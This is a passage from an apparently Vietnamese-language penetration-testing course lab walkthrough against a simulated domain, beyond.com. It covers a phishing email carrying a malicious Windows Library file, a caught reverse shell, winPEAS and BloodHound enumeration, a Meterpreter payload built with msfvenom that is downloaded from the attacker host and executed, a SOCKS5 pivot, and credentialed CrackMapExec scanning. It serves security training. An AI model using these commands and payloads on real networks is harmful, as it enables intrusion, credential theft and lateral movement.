Lệnh hoàn chỉnh được hiển thị trong listing sau. Sau khi nhập lệnh, chúng ta cần cung cấp thông tin xác thực của **john**:

```
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.50.242:25...
=== Connected to 192.168.50.242.
<-  220 MAILSRV1 ESMTP
 -> EHLO kali
<-  250-MAILSRV1
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> am9obg==
<-  334 UGFzc3dvcmQ6
 -> ZHFzVHdUcFpQbiNuTA==
<-  235 authenticated.
 -> MAIL FROM:<john@beyond.com>
<-  250 OK
 -> RCPT TO:<marcus@beyond.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 36 lines sent
<-  250 Queued (1.088 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

                       *Listing 38 - Gửi email kèm file Windows Library tới marcus và daniela*

Sau khi chờ một lúc, chúng ta nhận được các request tới WebDAV và Python3 web server. Hãy kiểm tra Netcat listener.

```
listening on [any] 4444 ...
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 64264
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> 
```

                                            *Listing 39 - Reverse shell đến trên cổng 4444*

Tuyệt vời! Listing 39 cho thấy cuộc tấn công phía client thông qua email của chúng ta đã thành công và chúng ta đã có được một interactive shell trên một máy.

Hãy hiển thị user hiện tại, hostname và địa chỉ IP để xác nhận rằng chúng ta đã có foothold ban đầu trong mạng nội bộ.

```
PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus

PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1

PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.6.243
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.6.254
PS C:\Windows\System32\WindowsPowerShell\v1.0>
```

                                *Listing 40 - Thu thập thông tin cơ bản về máy mục tiêu*

Listing 40 cho thấy chúng ta đã đặt chân lên hệ thống **CLIENTWK1** với tư cách domain user **marcus**. Ngoài ra, địa chỉ IP của hệ thống là **172.16.6.243/24**, cho thấy đây là một dải IP nội bộ. Chúng ta cũng nên ghi lại địa chỉ IP và thông tin mạng, chẳng hạn như subnet và gateway, trong thư mục workspace của mình.

Hãy tóm tắt ngắn gọn những gì chúng ta đã làm trong phần này. Trước tiên, chúng ta đã thiết lập máy Kali để cung cấp các dịch vụ và file cần thiết cho cuộc tấn công. Sau đó, chúng ta chuẩn bị file Windows Library và shortcut trên **WINPREP**. Khi gửi email kèm file đính kèm, chúng ta đã nhận được một reverse shell từ **CLIENTWK1** trong mạng nội bộ.

---

# **4. Enumerating the Internal Network**

---

Learning Unit này bao gồm các Learning Objective sau:

- Nắm bắt tình hình tổng thể trong một mạng
- Liệt kê các host, dịch vụ và phiên làm việc trong một mạng mục tiêu
- Xác định các vector tấn công trong một mạng mục tiêu

Trong Learning Unit trước, chúng ta đã giành được foothold ban đầu trên máy **CLIENTWK1**. Vì hiện tại chúng ta chưa có bất kỳ thông tin nào về hệ thống cục bộ hay mạng nội bộ, chúng ta cần phải thu thập thông tin về cả hai. Trước tiên, chúng ta sẽ liệt kê **CLIENTWK1**, sau đó là môi trường **Active Directory**. Mục tiêu của chúng ta là xác định các vector lateral movement tiềm năng hoặc các cách để leo thang đặc quyền.

---

## 4.1. Nhận Thức Tình Huống

---

Trong phần này, chúng ta sẽ cố gắng đạt được nhận thức tình huống đối với hệ thống **CLIENTWK1** và mạng nội bộ. Trước tiên, chúng ta sẽ thực hiện liệt kê cục bộ trên **CLIENTWK1** để có cái nhìn tổng quan về hệ thống và xác định các thông tin, dữ liệu có giá trị tiềm năng. Sau đó, chúng ta sẽ liệt kê domain để phát hiện người dùng, máy tính, domain administrator và các vector tiềm năng cho lateral movement cũng như leo thang đặc quyền.

Đối với Learning Unit này, chúng ta sẽ không lưu trữ tường minh mọi kết quả vào thư mục workspace trên Kali. Tuy nhiên, để làm quen với quy trình ghi chép, bạn nên tạo ghi chú cho tất cả các phát hiện và thông tin trong quá trình thực hành.

Hãy bắt đầu bằng việc liệt kê máy **CLIENTWK1**. Chúng ta sẽ sao chép file thực thi **winPEAS** 64-bit vào thư mục đang được phục vụ bởi Python3 web server. Trên **CLIENTWK1**, chúng ta sẽ chuyển thư mục hiện tại sang thư mục home của **marcus** và tải **winPEAS** từ máy Kali. Sau khi tải xong, chúng ta sẽ chạy nó.

```
PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\marcus
cd C:\Users\marcus

PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.119.5:8000/winPEASx64.exe -Outfile winPEAS.exe

PS C:\Users\marcus> .\winPEAS.exe
.\winPEAS.exe
...
```

                                              *Listing 41 - Tải xuống và thực thi winPEAS*

Hãy xem lại một số kết quả do winPEAS cung cấp. Chúng ta sẽ bắt đầu với phần **Basic System Information**.

```
��������͹ Basic System Information
� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    Hostname: CLIENTWK1
    Domain Name: beyond.com
    ProductName: Windows 10 Pro
    EditionID: Professional
```

                                                      *Listing 42 - Thông tin hệ thống cơ bản*

Listing 42 cho thấy winPEAS đã phát hiện hệ điều hành của **CLIENTWK1** là Windows 10 Pro. Như đã học trong khóa học, winPEAS có thể nhận diện nhầm Windows 11 thành Windows 10, vì vậy hãy kiểm tra thủ công hệ điều hành bằng **systeminfo**.

```
PS C:\Users\marcus> systeminfo
systeminfo

Host Name:                 CLIENTWK1
OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22000 N/A Build 22000
```

                                                         *Listing 43 - Thông tin hệ điều hành*

Quả thật, Windows 11 là hệ điều hành đang chạy trên **CLIENTWK1**. Nếu chúng ta mù quáng dựa vào kết quả của winPEAS, chúng ta có thể đã đưa ra những giả định sai ngay từ đầu.

Theo kinh nghiệm, một penetration tester sẽ phát triển được cảm nhận về những thông tin nào từ các công cụ tự động cần được kiểm chứng lại.

Quay lại xem output của winPEAS, chúng ta bắt gặp phần **AV**.

```
����������͹ AV Information
  [X] Exception: Object reference not set to an instance of an object.
    No AV was detected!!
    Not Found
```

                                                                  *Listing 44 - Thông tin AV*

Không phát hiện thấy AV nào. Điều này sẽ khiến việc sử dụng các công cụ và payload khác như Meterpreter trở nên dễ dàng hơn nhiều.

Hãy tiếp tục xem thông tin mạng như **Network Ifaces**, **known hosts** và **DNS cached**.

```
����������͹ Network Ifaces and known hosts
� The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:8A:0F:27]: 172.16.6.243 / 255.255.255.0
        Gateways: 172.16.6.254
        DNSs: 172.16.6.240
        Known hosts:
          169.254.255.255       00-00-00-00-00-00     Invalid
          172.16.6.240          00-50-56-8A-08-34     Dynamic
          172.16.6.254          00-50-56-8A-DA-71     Dynamic
          172.16.6.255          FF-FF-FF-FF-FF-FF     Static
...

����������͹ DNS cached --limit 70--
    Entry                                 Name                                  Data
dcsrv1.beyond.com                     DCSRV1.beyond.com                     172.16.6.240
mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.6.254
```

                                  *Listing 45 - Network interface, known hosts và DNS cache*

Listing 45 cho thấy các bản ghi DNS cho **mailsrv1.beyond.com** (172.16.6.254) và **dcsrv1.beyond.com** (172.16.6.240) đã được cache trên **CLIENTWK1**. Dựa trên tên gọi, chúng ta có thể giả định rằng **DCSRV1** là domain controller của domain **beyond.com**.

Hơn nữa, vì **MAILSRV1** được phát hiện với địa chỉ IP nội bộ **172.16.6.254** và trước đó chúng ta đã liệt kê máy này từ bên ngoài qua **192.168.50.242**, chúng ta có thể khẳng định rằng đây là một **dual-homed host**.

Tương tự như với credential, hãy tạo một file văn bản tên **computer.txt** trong **/home/kali/beyond/** để ghi lại các máy nội bộ đã xác định và thông tin bổ sung về chúng.

```
kali@kali:~/beyond$ cat computer.txt                                        
172.16.6.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.6.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.50.242)

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```

            *Listing 46 - Danh sách chứa thông tin quan trọng nhất về các máy mục tiêu đã xác định*

Xem xét phần còn lại của output winPEAS, chúng ta không tìm thấy thông tin nào có thể khai thác để thực hiện leo thang đặc quyền. Tuy nhiên, cần nhắc lại rằng đây là một bài kiểm thử xâm nhập mô phỏng, không phải môi trường CTF. Do đó, không nhất thiết phải có quyền quản trị trên mọi máy.

Mặc dù chúng ta đã bỏ qua phần lớn output của winPEAS, trong một bài kiểm thử xâm nhập thực tế, chúng ta cần phân tích kỹ lưỡng toàn bộ kết quả. Sau khi liệt kê cục bộ hệ thống, chúng ta nên thu thập được các mảnh thông tin then chốt, như đã liệt kê trong phần **Situational Awareness** của Module **Windows Privilege Escalation**.

Vì chúng ta chưa xác định được vector leo thang đặc quyền nào thông qua winPEAS và cũng không có gì khác có thể khai thác trên hệ thống, chẳng hạn như Password Manager, hãy bắt đầu liệt kê môi trường **Active Directory** và các đối tượng của nó.

Chúng ta đã học nhiều kỹ thuật trong khóa học để thực hiện loại liệt kê này. Đối với Module này, chúng ta sẽ sử dụng **BloodHound** với collector **SharpHound.ps1**, đã được thảo luận trong Module **Active Directory Introduction and Enumeration**.

Trước tiên, hãy sao chép PowerShell collector vào **/home/kali/beyond** trong một terminal tab mới để phục vụ nó qua Python3 web server trên cổng **8000**.

```
kali@kali:~/beyond$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```

                               *Listing 47 - Sao chép SharpHound collector vào thư mục beyond*

Vì Python3 web server của chúng ta vẫn đang chạy trên cổng 8000, chúng ta có thể tải script PowerShell về máy mục tiêu và import nó trong một phiên PowerShell mới với **ExecutionPolicy** được đặt thành **Bypass**.

```
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1

PS C:\Users\marcus> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\marcus> . .\SharpHound.ps1
. .\SharpHound.ps1
```

                                  *Listing 48 - Tải và import PowerShell BloodHound collector*

Bây giờ, chúng ta có thể thực thi **Invoke-BloodHound** bằng cách cung cấp **All** cho tham số **-CollectionMethod** để chạy tất cả các phương thức thu thập có sẵn.

```
PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All
2022-10-10T07:24:34.3593616-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2022-10-10T07:24:34.5781410-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-10-10T07:24:34.5937984-07:00|INFORMATION|Initializing SharpHound at 7:24 AM on 10/10/2022
2022-10-10T07:24:35.0781142-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-10-10T07:24:35.3281888-07:00|INFORMATION|Beginning LDAP search for beyond.com
2022-10-10T07:24:35.3906114-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-10-10T07:24:35.3906114-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-10-10T07:25:06.1421842-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 92 MB RAM
2022-10-10T07:25:21.6307386-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2022-10-10T07:25:21.6932468-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2022-10-10T07:25:21.8338601-07:00|INFORMATION|Status: 98 objects finished (+98 2.130435)/s -- Using 103 MB RAM
2022-10-10T07:25:21.8338601-07:00|INFORMATION|Enumeration finished in 00:00:46.5180822
2022-10-10T07:25:21.9414294-07:00|INFORMATION|Saving cache with stats: 57 ID to type mappings.
 58 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2022-10-10T07:25:21.9570748-07:00|INFORMATION|SharpHound Enumeration Completed at 7:25 AM on 10/10/2022! Happy Graphing!
```

                                       *Listing 49 - Thực thi PowerShell BloodHound collector*

Sau khi SharpHound hoàn tất, chúng ta có thể liệt kê các file trong thư mục để xác định file ZIP chứa kết quả liệt kê.

```
PS C:\Users\marcus> dir  
dir

    Directory: C:\Users\marcus
    
Mode                 LastWriteTime         Length Name     
----                 -------------         ------ ----     
d-r---         9/29/2022   1:49 AM                Contacts 
d-r---         9/29/2022   1:49 AM                Desktop  
d-r---         9/29/2022   4:37 AM                Documents
d-r---         9/29/2022   4:33 AM                Downloads
d-r---         9/29/2022   1:49 AM                Favorites
d-r---         9/29/2022   1:49 AM                Links   
d-r---         9/29/2022   1:49 AM                Music   
d-r---         9/29/2022   1:50 AM                OneDrive
d-r---         9/29/2022   1:50 AM                Pictures
d-r---         9/29/2022   1:49 AM                Saved Games 
d-r---         9/29/2022   1:50 AM                Searches          
d-r---         9/29/2022   4:30 AM                Videos               
-a----        10/10/2022   7:25 AM          11995 20221010072521_BloodHound.zip 
-a----        10/10/2022   7:23 AM        1318097 SharpHound.ps1     
-a----        10/10/2022   5:02 AM        1936384 winPEAS.exe         
-a----        10/10/2022   7:25 AM           8703 Zjc5OGNlNTktMzQ0Ni00YThkLWEzZjEtNWNhZGJlNzdmODZl.bin
```

                              *Listing 50 - Liệt kê thư mục để xác định tên file ZIP của SharpHound*

Hãy chuyển file này về máy Kali, sau đó khởi chạy **neo4j** và **BloodHound**. Khi BloodHound đã khởi động, chúng ta sẽ upload file ZIP bằng chức năng **Upload Data**.

![image.png](image%208.png)

                                              *Hình 9: Upload file ZIP vào BloodHound*

Khi quá trình upload hoàn tất, chúng ta có thể bắt đầu liệt kê môi trường AD bằng BloodHound.

Trước khi bắt đầu, hãy điểm qua nhanh một số khả năng của BloodHound. Như đã học, BloodHound chứa nhiều truy vấn dựng sẵn như **Find all Domain Admins**. Các truy vấn này được xây dựng bằng **Cypher Query Language**. Ngoài các truy vấn dựng sẵn, BloodHound còn cho phép nhập truy vấn tùy chỉnh thông qua chức năng **Raw Query** ở phía dưới GUI.

Vì hiện tại chúng ta quan tâm tới việc liệt kê domain cơ bản, chẳng hạn như liệt kê người dùng và máy tính AD, chúng ta cần xây dựng và nhập các truy vấn tùy chỉnh vì các chức năng dựng sẵn không cung cấp khả năng này.

Hãy xây dựng một raw query để hiển thị tất cả các máy tính được collector xác định. Truy vấn bắt đầu bằng từ khóa **MATCH**, dùng để chọn một tập đối tượng. Sau đó, chúng ta đặt biến **m** chứa tất cả các đối tượng trong cơ sở dữ liệu có thuộc tính **Computer**. Tiếp theo, chúng ta dùng từ khóa **RETURN** để xây dựng đồ thị kết quả dựa trên các đối tượng trong **m**.

```
MATCH (m:Computer) RETURN m
```

                                 *Listing 51 - Truy vấn tùy chỉnh để hiển thị tất cả các máy tính*

Hãy nhập truy vấn này vào phần **Raw Query** và dựng đồ thị.

![image.png](image%209.png)

              *Hình 10: Hiển thị tất cả các đối tượng Computer trong domain BEYOND.COM*

Hình 10 cho thấy có bốn đối tượng máy tính trong domain. Bằng cách nhấp vào các node, chúng ta có thể thu thập thêm thông tin về các đối tượng máy tính, chẳng hạn như hệ điều hành.

```
DCSRV1.BEYOND.COM - Windows Server 2022 Standard
INTERNALSRV1.BEYOND.COM - Windows Server 2022 Standard
MAILSRV1.BEYOND.COM - Windows Server 2022 Standard
CLIENTWK1.BEYOND.COM - Windows 11 Pro
```

                  *Listing 52 - Các đối tượng máy tính đã xác định và hệ điều hành của chúng*

Ngoài **CLIENTWK1**, nơi chúng ta đang có interactive shell, BloodHound cũng đã xác định domain controller **DCSRV1** và mail server **MAILSRV1** (dual-homed) đã biết trước đó. Ngoài ra, nó còn phát hiện một máy khác có tên **INTERNALSRV1**.

Hãy lấy địa chỉ IP của **INTERNALSRV1** bằng **nslookup**.

```
PS C:\Users\marcus> nslookup INTERNALSRV1.BEYOND.COM
nslookup INTERNALSRV1.BEYOND.COM
Server:  UnKnown
Address:  172.16.6.240

Name:    INTERNALSRV1.BEYOND.COM
Address:  172.16.6.241
```

                                 *Listing 53 - Tra cứu địa chỉ IP của INTERNALSRV1 bằng nslookup*

Listing 53 cho thấy địa chỉ IP của **INTERNALSRV1** là **172.16.6.241**. Hãy thêm thông tin này vào **computer.txt** trên máy Kali.

```
172.16.6.240 - DCSRV1.BEYOND.COM
-> Domain Controller

172.16.6.241 - INTERNALSRV1.BEYOND.COM

172.16.6.254 - MAILSRV1.BEYOND.COM
-> Mail Server
-> Dual Homed Host (External IP: 192.168.50.242)

172.16.6.243 - CLIENTWK1.BEYOND.COM
-> User _marcus_ fetches emails on this machine
```

                                 *Listing 54 - Ghi chép kết quả và thông tin trong computer.txt*

Tiếp theo, chúng ta muốn hiển thị tất cả các tài khoản người dùng trong domain. Để làm điều này, chúng ta có thể thay thuộc tính **Computer** trong truy vấn trước đó bằng **User**.

![image.png](image%2010.png)

                        *Hình 11: Hiển thị tất cả các đối tượng User trong domain BEYOND.COM*

Hình 11 cho thấy ngoài các tài khoản AD mặc định, còn có bốn đối tượng tài khoản người dùng khác trong domain.

```
BECCY
JOHN
DANIELA
MARCUS
```

                                                  *Listing 55 - Các domain user được phát hiện*

Chúng ta đã xác định **john** và **marcus** là các domain user hợp lệ trong các bước trước. Tuy nhiên, chúng ta chưa xác nhận được liệu **daniela** cũng là domain user hay chỉ là local user trên **WEBSRV1**. Ngoài ra, chúng ta còn phát hiện một user mới tên là **beccy**. Hãy cập nhật **usernames.txt** cho phù hợp.

Để có thể sử dụng một số truy vấn dựng sẵn của BloodHound, chúng ta có thể đánh dấu **marcus** (interactive shell trên CLIENTWK1) và **john** (credential hợp lệ) là **Owned**. Để làm điều này, hãy nhấp chuột phải vào các node **MARCUS@BEYOND.COM** và **JOHN@BEYOND.COM**, sau đó chọn **Mark User as Owned**.

Tiếp theo, hãy hiển thị tất cả các domain administrator bằng cách sử dụng truy vấn dựng sẵn **Find all Domain Admins** trong tab **Analysis**.

![image.png](image%2011.png)

                        *Hình 12: Hiển thị tất cả các Domain Admin trong domain BEYOND.COM*

Hình 12 cho thấy ngoài tài khoản domain **Administrator** mặc định, **beccy** cũng là thành viên của nhóm **Domain Admins**.

Trong một bài kiểm thử xâm nhập thực tế, chúng ta cũng nên xem xét các domain group và GPO. Việc liệt kê cả hai thường là một phương pháp rất mạnh để leo thang đặc quyền trong domain hoặc giành quyền truy cập vào các hệ thống khác. Đối với bài kiểm thử xâm nhập mô phỏng này, chúng ta sẽ bỏ qua hai bước liệt kê đó vì chúng không mang lại giá trị bổ sung cho môi trường này.

Tiếp theo, hãy sử dụng một số truy vấn dựng sẵn để tìm các vector tiềm năng nhằm leo thang đặc quyền hoặc giành quyền truy cập vào các hệ thống khác. Chúng ta sẽ chạy các truy vấn dựng sẵn sau:

- **Find Workstations where Domain Users can RDP**
- **Find Servers where Domain Users can RDP**
- **Find Computers where Domain Users are Local Admin**
- **Shortest Path to Domain Admins from Owned Principals**

Đáng tiếc là không có truy vấn nào trong số này trả về kết quả. Điều này có nghĩa là BloodHound không xác định được workstation hoặc server nào mà Domain Users có thể đăng nhập qua RDP.

Ngoài ra, không có Domain User nào là local Administrator trên bất kỳ computer object nào. Do đó, chúng ta không có quyền truy cập đặc quyền trên bất kỳ máy domain nào với tư cách **john** hoặc **marcus**.

Cuối cùng, BloodHound cũng không xác định được đường đi trực tiếp nào từ các user đã được đánh dấu Owned tới nhóm **Domain Admins**.

Các truy vấn dựng sẵn này thường là một cách nhanh chóng và mạnh mẽ để xác định “low hanging fruit” trong quá trình tìm cách leo thang đặc quyền và giành quyền truy cập vào các hệ thống khác. Vì BloodHound không cung cấp cho chúng ta vector có thể khai thác, chúng ta phải sử dụng các phương pháp khác.

Chúng ta cũng có thể đã dùng **PowerView** hoặc các truy vấn **LDAP** để thu thập toàn bộ thông tin này. Tuy nhiên, trong hầu hết các bài kiểm thử xâm nhập, chúng ta muốn dùng BloodHound trước vì output của các phương pháp khác có thể rất đồ sộ. Đây là một công cụ hiệu quả và mạnh mẽ để nhanh chóng hiểu sâu hơn về môi trường Active Directory. Chúng ta cũng có thể dùng các truy vấn raw hoặc dựng sẵn để xác định các vector tấn công rất phức tạp và hiển thị chúng dưới dạng đồ họa tương tác.

Trước khi tiếp tục liệt kê domain trong phần tiếp theo, hãy tóm tắt những thông tin mà chúng ta đã thu được cho đến thời điểm này. Chúng ta đã xác định bốn computer object và bốn user account, đồng thời biết rằng **beccy** là thành viên của nhóm **Domain Admins**, khiến tài khoản này trở thành một mục tiêu có giá trị cao. Ngoài ra, chúng ta cũng đã loại trừ một số vector có thể đã cho phép chúng ta truy cập vào các hệ thống khác hoặc các user có đặc quyền.

---

## 4.2. Dịch Vụ và Phiên

---

Trong phần trước, chúng ta đã thực hiện liệt kê cơ bản để hiểu môi trường Active Directory.

Trong phần này, chúng ta sẽ tiếp tục liệt kê mạng mục tiêu để xác định các vector tấn công tiềm năng. Trước tiên, chúng ta sẽ xem tất cả các phiên người dùng đang hoạt động trên các máy. Sau đó, chúng ta sẽ kiểm tra các tài khoản người dùng để xác định sự tồn tại của SPN. Cuối cùng, chúng ta sẽ tận dụng các công cụ như Nmap và CrackMapExec thông qua một proxy SOCKS5 để xác định các dịch vụ có thể truy cập được.

Để xem các phiên đang hoạt động, chúng ta sẽ sử dụng một truy vấn tùy chỉnh trong BloodHound. Vì Cypher là một ngôn ngữ truy vấn, chúng ta có thể xây dựng truy vấn quan hệ với cú pháp sau: (NODES)-[:RELATIONSHIP]->(NODES).

Quan hệ cho trường hợp sử dụng của chúng ta là [:HasSession]. Node đầu tiên của quan hệ được chỉ định bởi một thuộc tính là (c:Computer) và node thứ hai là (m:User). Nghĩa là, cạnh giữa hai node có nguồn tại đối tượng computer. Chúng ta sẽ dùng p để lưu trữ và hiển thị dữ liệu.

```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

                     *Listing 56 - Truy vấn tùy chỉnh để hiển thị tất cả các phiên đang hoạt động*

Bây giờ, hãy nhập truy vấn tùy chỉnh trong BloodHound:

![image.png](image%2012.png)

               *Hình 13: Hiển thị tất cả các phiên đang hoạt động trong domain BEYOND.COM*

Hình 13 cho thấy truy vấn của chúng ta trả về ba phiên đang hoạt động. Như dự đoán, CLIENTWK1 có một phiên đang hoạt động với người dùng marcus.

Điều thú vị là tài khoản domain administrator beccy đã được xác định trước đó có một phiên đang hoạt động trên MAILSRV1. Nếu chúng ta giành được quyền truy cập đặc quyền vào máy này, chúng ta có thể trích xuất NTLM hash của user này.

Người dùng của phiên đang hoạt động thứ ba được hiển thị dưới dạng một SID. BloodHound sử dụng cách biểu diễn principal này khi định danh domain của SID thuộc về một máy cục bộ. Với phiên này, điều đó có nghĩa là local Administrator (được chỉ ra bởi RID 500) có một phiên đang hoạt động trên INTERNALSRV1.

Bước tiếp theo là xác định tất cả các user có thể kerberoast được trong domain. Để làm điều này, chúng ta có thể sử dụng truy vấn dựng sẵn **List all Kerberoastable Accounts** trong BloodHound.

![image.png](image%2013.png)

    *Hình 14: Hiển thị tất cả các tài khoản người dùng kerberoastable trong domain BEYOND.COM*

Hình 14 cho thấy ngoài krbtgt, daniela cũng kerberoastable.

Tài khoản người dùng krbtgt hoạt động như service account cho Key Distribution Center (KDC) và chịu trách nhiệm mã hóa và ký các Kerberos ticket. Khi một domain được thiết lập, một mật khẩu được tạo ngẫu nhiên cho tài khoản người dùng này, khiến việc tấn công mật khẩu trở nên không khả thi. Vì vậy, chúng ta thường có thể bỏ qua krbtgt trong bối cảnh Kerberoasting.

Hãy kiểm tra SPN của daniela trong BloodHound thông qua menu Node Info bằng cách nhấp vào node.

![image.png](image%2014.png)

                                                  *Hình 15: SPN của tài khoản người dùng daniela*

Hình 15 cho thấy SPN được ánh xạ http/internalsrv1.beyond.com. Dựa trên điều này, chúng ta có thể giả định rằng một web server đang chạy trên INTERNALSRV1. Khi chúng ta đã thực hiện Kerberoasting và có thể thu được plaintext password của daniela, chúng ta có thể dùng nó để truy cập INTERNALSRV1.

Tuy nhiên, như chúng ta đã nêu trước đó, việc tìm thấy một vector có thể khai thác không nên làm gián đoạn quá trình liệt kê của chúng ta. Chúng ta nên thu thập tất cả thông tin, ưu tiên nó, và sau đó thực hiện các cuộc tấn công tiềm năng.

Do đó, hãy thiết lập một SOCKS5 proxy để thực hiện liệt kê mạng thông qua Nmap và CrackMapExec nhằm xác định các dịch vụ có thể truy cập, các cổng mở, và cấu hình SMB.

Trước tiên, chúng ta sẽ tạo một staged Meterpreter TCP reverse shell dưới dạng một file thực thi với msfvenom. Vì chúng ta có thể tái sử dụng binary trong toàn domain, chúng ta có thể lưu nó trong /home/kali/beyond.

```
kali@kali:~/beyond$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.5 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: met.exe
```

                                             *Listing 57 - Tạo file thực thi Meterpreter reverse shell*

Bây giờ, hãy khởi chạy một multi/handler listener với các thiết lập tương ứng trong Metasploit. Ngoài ra, chúng ta sẽ đặt tùy chọn ExitOnSession thành false. Nó chỉ định rằng listener vẫn hoạt động cho các session mới mà không cần khởi động lại cho mỗi session đến.

```
kali@kali:~/beyond$ sudo msfconsole -q

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 192.168.119.5
LHOST => 192.168.119.5

msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443

msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false

msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started HTTPS reverse handler on https://192.168.119.5:443
```

                                           *Listing 58 - Khởi chạy Metasploit listener trên cổng 443*

Tiếp theo, chúng ta có thể tải xuống và thực thi met.exe trên CLIENTWK1.

```
PS C:\Users\marcus> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe

PS C:\Users\marcus> .\met.exe
```

                                   *Listing 59 - Tải xuống và thực thi Meterpreter reverse shell*

Trong Metasploit, một session mới sẽ xuất hiện:

```
[*] Meterpreter session 1 opened (192.168.119.5:443 -> 192.168.50.242:64234) at 2022-10-11 07:05:22 -0400
```

                                                         *Listing 60 - Session đến trong Metasploit*

Khi session 1 đã mở, chúng ta có thể sử dụng multi/manage/autoroute và auxiliary/server/socks_proxy để tạo một proxy SOCKS5 để truy cập mạng nội bộ từ Kali, như đã học trong Module “The Metasploit Framework”.

```
msf6 exploit(multi/handler) > use multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set session 1
session => 1

msf6 post(multi/manage/autoroute) > run
[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against CLIENTWK1
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.6.0/255.255.255.0 from host's routing table.
[*] Post module execution completed

msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1

msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5

msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 2.
```

                          *Listing 61 - Tạo proxy SOCKS5 để truy cập mạng nội bộ từ máy Kali*

Proxy SOCKS5 hiện đã hoạt động và chúng ta có thể dùng proxychains để truy cập mạng nội bộ. Hãy xác nhận rằng /etc/proxychains4.conf vẫn chứa các thiết lập cần thiết từ các Module trước. Nghĩa là, chỉ entry SOCKS5 trong listing sau nên được bật.

```
kali@kali:~/beyond$ cat /etc/proxychains4.conf
...
socks5  127.0.0.1 1080
```

                                         *Listing 62 - Thiết lập trong file cấu hình proxychains*

Cuối cùng, chúng ta đã sẵn sàng để liệt kê mạng thông qua Proxychains.

Hãy bắt đầu với SMB module của CrackMapExec để lấy thông tin cơ bản của các server đã xác định (chẳng hạn như thiết lập SMB). Chúng ta cũng sẽ cung cấp credential của john để liệt kê các SMB share và quyền của chúng với --shares. Vì CrackMapExec không có tùy chọn chỉ định output file, chúng ta sẽ copy kết quả thủ công và lưu chúng vào một file.

```
kali@kali:~/beyond$ proxychains -q crackmapexec smb 172.16.6.240-241 172.16.6.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
